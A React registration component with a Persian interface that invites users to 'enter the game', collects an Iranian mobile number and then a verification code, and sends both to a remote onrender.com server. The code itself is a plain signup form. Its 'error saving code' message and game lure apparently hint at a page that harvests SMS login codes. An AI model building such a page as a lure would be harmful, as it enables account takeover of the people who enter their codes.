import { useState } from "react";

export default function Register() {
  const [step, setStep] = useState(0);
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const sendPhone = async () => {
    if (phone.length !== 11 || !phone.startsWith("09")) {
      alert("شماره معتبر نیست");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(
        "https://khafan-site.onrender.com/phone",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ phone }),
        }
      );

      const data = await res.json();

      localStorage.setItem("userId", data.id);

      setStep(2);
    } catch (err) {
      console.error(err);
      alert("خطا در اتصال به سرور");
    }

    setLoading(false);
  };

  const verifyCode = async () => {
    const userId = localStorage.getItem("userId");

    if (!userId) {
      alert("شناسه کاربر پیدا نشد");
      return;
    }

    if (code.length < 4) {
      alert("کد معتبر نیست");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(
        "https://khafan-site.onrender.com/verify",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            id: userId,
            code,
          }),
        }
      );

      const data = await res.json();

      if (data.ok) {
        setStep(3);
      } else {
        alert("کد اشتباه است");
      }
    } catch (err) {
      console.error(err);
      alert("خطا در ذخیره کد");
    }

    setLoading(false);
  };

  return (
    <div className="container">
      {step === 0 && (
        <div className="card">
          <h1>ورود به بازی</h1>

          <button
            className="btn"
            onClick={() => setStep(1)}
          >
            ثبت نام
          </button>
        </div>
      )}

      {step === 1 && (
        <div className="card">
          <h2>ثبت شماره موبایل</h2>

          <input
            type="tel"
            value={phone}
            maxLength={11}
            placeholder="09xxxxxxxxx"
            onChange={(e) =>
              setPhone(
                e.target.value
                  .replace(/\D/g, "")
                  .slice(0, 11)
              )
            }
          />

          <button
            className="btn"
            onClick={sendPhone}
          >
            ارسال کد
          </button>
        </div>
      )}

      {step === 2 && (
        <div className="card">
          <h2>کد تایید</h2>

          <input
            value={code}
            maxLength={6}
            placeholder="کد"
            onChange={(e) =>
              setCode(
                e.target.value
                  .replace(/\D/g, "")
                  .slice(0, 6)
              )
            }
          />

          <button
            className="btn"
            onClick={verifyCode}
          >
            تایید
          </button>
        </div>
      )}

      {step === 3 && (
        <div className="card">
          <h2>ثبت نام انجام شد</h2>
          <p>در حال ورود...</p>
        </div>
      )}

      {loading && (
        <div className="overlay">
          <div className="loader">Loading...</div>
        </div>
      )}
    </div>
  );
}